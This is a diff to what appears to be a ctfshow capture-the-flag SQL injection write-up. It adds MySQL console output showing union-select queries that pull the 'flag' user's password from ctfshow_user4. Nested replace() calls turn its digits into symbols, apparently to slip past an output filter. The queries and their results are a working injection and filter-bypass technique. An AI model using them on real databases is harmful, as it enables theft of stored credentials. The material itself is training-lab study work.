@@ -167,6 +167,49 @@ When we access the strings, we can use corresponding function to convert JSON st
 ```SQL
 select id, username, password from ctfshow_user4 where username != 'flag' and id = '999' union select 'a', 'AAAA', replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password, '0', ')'), '1', '!'), '2', '@'), '3', '#'), '4', '$'), '5', '%'), '6', '^'), '7', '&'), '8', '*'), '9', '(') from ctfshow_user4 where username = 'flag' limit 1;
 ```
-```SQL
-select id, username, password from ctfshow_user4 where username != 'flag' and id = '999' union select 'a', 'AAAA', replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password, 0, ')'), 1, '!'), 2, '@'), 3, '#'), 4, '$'), 5, '%'), 6, '^'), 7, '&'), 8, '*'), 9, '(') from ctfshow_user4 where username = 'flag' limit 1;
+![[Pasted image 20241221102227.png]]
+```
+mysql> select id, username, password from ctfshow_user4 where username != 'flag' and id = '999' union select 'a', 'AAAA', password from ctfshow_user4 where username = 'flag' limit 1;
+
++----+----------+------------+
+
+| id | username | password |
+
++----+----------+------------+
+
+| a | AAAA | a1b2c3d4e5 |
+
++----+----------+------------+
+
+1 row in set (0.01 sec)
+```
+
+```
+mysql> select id, username, password from ctfshow_user4 where username != 'flag' and id = '999' union select 'a', 'AAAA', password from ctfshow_user4 where username = 'flag' limit 1;
+
++----+----------+------------+
+
+| id | username | password |
+
++----+----------+------------+
+
+| a | AAAA | a1b2c3d4e5 |
+
++----+----------+------------+
+
+1 row in set (0.01 sec)
+
+mysql> select id, username, password from ctfshow_user4 where username != 'flag' and id = '999' union select 'a', 'AAAA', replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password, '0', ')'), '1', '!'), '2', '@'), '3', '#'), '4', '$'), '5', '%'), '6', '^'), '7', '&'), '8', '*'), '9', '(') from ctfshow_user4 where username = 'flag' limit 1;
+
++----+----------+------------+
+
+| id | username | password |
+
++----+----------+------------+
+
+| a | AAAA | a!b@c#d$e% |
+
++----+----------+------------+
+
+1 row in set (0.01 sec)
 ```
